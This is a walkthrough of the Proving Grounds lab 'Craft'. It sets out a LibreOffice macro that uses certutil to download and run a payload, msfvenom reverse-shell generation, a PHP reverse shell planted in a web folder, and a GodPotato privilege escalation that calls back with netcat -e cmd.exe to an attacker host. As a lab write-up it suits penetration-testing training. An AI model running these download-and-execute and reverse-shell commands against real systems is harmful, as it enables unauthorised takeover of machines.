---
title: Craft
date: 2026-03-29T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - macros
  - proving-grounds
  - updog
  - revshells
  - godpotato
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Craft"
---

"For what level of mediocrity will you settle?"  
--Brandon Lee

![](Screenshot%202026-01-16%20at%2013.55.41.png)


![](Screenshot%202026-01-16%20at%2018.54.54.png)

Create a document.odt in Libre. 
	Navigate to: Tools > Macros > Organise Macros > Basic 
	
![](Screenshot%202026-01-16%20at%2018.57.17.png)

Create a new macro and inset the following code:

Sub Main
    Shell("cmd /c certutil -urlcache -f http://192.168.45.240/msf443.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe")

End Sub`
![](Screenshot%202026-03-31%20at%2012.25.17.png)

Note: I Iost a lot of time because I hadn't selected the test.odt in macro > edit. This was critical to getting this working. 

![](Screenshot%202026-03-31%20at%2012.22.32.png)
New create a msfvenom package:
	` msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.168 LPORT=443 -f exe -o msf443.exe`

Start a http server and listener in another tab:
	`python -m http.server 80
	`rlwrap nc -lvnp 443

![](Screenshot%202026-01-16%20at%2019.03.30.png)

![](Screenshot%202026-01-16%20at%2019.05.10.png)

To pivot to the apache user we can put a php reverse shell in the htdocs folder and trigger it with the browser or curl. 

Create php revshell:

![](Screenshot%202026-03-31%20at%2010.58.46.png)

Start a server:
```
updog -p 80
```

Start a listener:
```
rlwrap nc -lvnp 1234 
```

Navigate to the htdocs folder:
```Victim
c:/xampp/htdocs
certutil -f -split -urlcache http://192.168.45.240/1234.php 1234.php

```

![](Screenshot%202026-03-31%20at%2010.58.19.png)

Trigger the php reverse shell:
```Kali
curl http://192.168.204.169/1234.php 
```

OR:

![](Screenshot%202026-03-31%20at%2011.36.57.png)

![](Screenshot%202026-03-31%20at%2010.57.45.png)

![](Screenshot%202026-03-31%20at%2011.00.32.png)

 As the apache user:

```Victim
certutil -f -split -urlcache http://192.168.45.240/GodPotato-NET4.exe GodPotato-NET4.exe
```

```Victim
certutil -f -split -urlcache http://192.168.45.240/nc64.exe nc64.exe
```

![](Screenshot%202026-03-31%20at%2011.21.03.png)

```kali
rlwrap nc -lvnp 1337
```

``` Victim
.\GodPotato-NET4.exe -cmd "cmd /c c:\xampp\htdocs\nc64.exe 192.168.45.240 1337 -t -e cmd.exe"
```

![](Screenshot%202026-03-31%20at%2012.07.13.png)

![](Screenshot%202026-03-31%20at%2011.17.46.png)

